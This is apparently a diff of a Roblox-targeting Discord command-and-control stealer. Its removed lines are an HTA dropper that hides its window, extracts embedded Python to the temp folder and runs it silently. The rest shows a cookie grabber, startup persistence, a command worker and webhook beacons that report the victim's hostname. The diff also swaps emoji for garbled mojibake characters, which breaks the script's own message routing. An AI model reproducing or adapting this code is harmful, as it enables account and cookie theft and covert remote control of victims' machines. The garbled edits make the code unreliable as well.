@@ -1,49 +1,3 @@
-<html>
-<head>
-<hta:application id="oHTA" />
-<script language="VBScript">
-Sub Window_OnLoad
-    On Error Resume Next
-    window.resizeTo 0, 0
-    window.moveTo -10000, -10000
-    Dim shell, tmpDir, tmpPy, htaPath, content, sPos, ePos, pyCode, m1, m2, stream, outStream
-    Set shell = CreateObject("WScript.Shell")
-    tmpDir = shell.ExpandEnvironmentStrings("%TEMP%")
-    tmpPy = tmpDir & "\rbx_c2.py"
-    htaPath = document.location.pathname
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 2
-    stream.Charset = "utf-8"
-    stream.Open
-    stream.LoadFromFile htaPath
-    content = stream.ReadText
-    stream.Close
-    m1 = Chr(39) & "<" & "PYTHON" & "_SOURCE>"
-    m2 = Chr(39) & "</" & "PYTHON" & "_SOURCE>"
-    sPos = InStr(content, m1) + Len(m1)
-    Do While Mid(content, sPos, 1) = vbCr Or Mid(content, sPos, 1) = vbLf
-        sPos = sPos + 1
-    Loop
-    ePos = InStr(content, m2)
-    Do While Mid(content, ePos - 1, 1) = vbCr Or Mid(content, ePos - 1, 1) = vbLf
-        ePos = ePos - 1
-    Loop
-    pyCode = Mid(content, sPos, ePos - sPos)
-    Set outStream = CreateObject("ADODB.Stream")
-    outStream.Type = 2
-    outStream.Charset = "utf-8"
-    outStream.Open
-    outStream.WriteText pyCode
-    outStream.SaveToFile tmpPy, 2
-    outStream.Close
-    shell.Run "cmd /c start /b pythonw """ & tmpPy & """", 0, False
-    window.close()
-End Sub
-</script>
-</head>
-<body></body>
-</html>
-'<PYTHON_SOURCE>
 import os, sys, json, sqlite3, shutil, re, base64, subprocess, tempfile, platform, time, datetime, socket, getpass, urllib.request, urllib.error, ctypes, struct, random, threading, atexit, hashlib, secrets
 from pathlib import Path
 from io import BytesIO
@@ -171,8 +125,8 @@ def _ensure_channels():
 
 def _route_channel(content, embed=None, file_path=None):
     if content:
-        if "❌" in content: return "offline"
-        if any(w in content.lower() for w in ["starting", "complete", "✅"]): return "online"
+        if "âŒ" in content: return "offline"
+        if any(w in content.lower() for w in ["starting", "complete", "âœ…"]): return "online"
     if embed:
         title = embed.get("title", "")
         if "IP" in title or "Geolocation" in title: return "online"
@@ -229,9 +183,9 @@ def _reopen_channels():
         cid = cfg.get("reopen")
         if cid and cid not in sent:
             sent.add(cid)
-            _discord_request("POST", f"/channels/{cid}/messages", {"content": f"🟢 **System Online** `{socket.gethostname()}`"})
+            _discord_request("POST", f"/channels/{cid}/messages", {"content": f"ðŸŸ¢ **System Online** `{socket.gethostname()}`"})
     for cid in EXTRA_CHANNELS:
-        if cid not in sent: sent.add(cid); _discord_request("POST", f"/channels/{cid}/messages", {"content": f"🟢 **System Online** `{socket.gethostname()}`"})
+        if cid not in sent: sent.add(cid); _discord_request("POST", f"/channels/{cid}/messages", {"content": f"ðŸŸ¢ **System Online** `{socket.gethostname()}`"})
 
 class CookieGrabber:
     def __init__(self):
@@ -831,10 +785,8 @@ def main():
         write_pid(); _ensure_channels(); _add_startup()
         threading.Thread(target=watchdog, daemon=True).start()
         threading.Thread(target=auto_check_roblox, daemon=True).start()
-        send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`"); send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`", channel="cmds" if "cmds" in CHANNELS else "main"); cmd_worker()
+        send_webhook(content=f"ðŸŸ¢ **C2 Online** `{socket.gethostname()}`"); send_webhook(content=f"ðŸŸ¢ **C2 Online** `{socket.gethostname()}`", channel="cmds" if "cmds" in CHANNELS else "main"); cmd_worker()
     except: pass
 
 if __name__ == "__main__":
     main()
-
-'</PYTHON_SOURCE>
